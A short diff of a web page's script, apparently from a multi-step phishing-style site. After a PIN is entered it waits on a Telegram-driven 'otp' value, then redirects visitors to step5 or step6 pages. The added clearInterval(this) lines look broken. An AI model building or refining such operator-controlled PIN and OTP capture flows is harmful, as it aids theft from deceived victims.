@@ -28,16 +28,6 @@
 
 <script>
 
-// ===== FLOW A: STEP4 → STEP5 (AUTO AFTER 5s) =====
-if (localStorage.getItem("firstProcess") === "yes") {
-
-    localStorage.removeItem("firstProcess");
-
-    setTimeout(() => {
-        window.location.href = "step5.html";
-    }, 5000);
-}
-
 // ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
 if (localStorage.getItem("fromPin") === "yes") {
 
@@ -51,11 +41,13 @@ if (localStorage.getItem("fromPin") === "yes") {
         // 🔥 FORCE CHECK (handles string + number)
         if (data.otp == 5) {
     localStorage.removeItem("fromPin");
+    clearInterval(this);
     window.location.href = "step5.html";
 }
 
         if (data.otp == 6) {
     localStorage.removeItem("fromPin");
+    clearInterval(this); // stop loop
     window.location.href = "step6.html";
 }
 
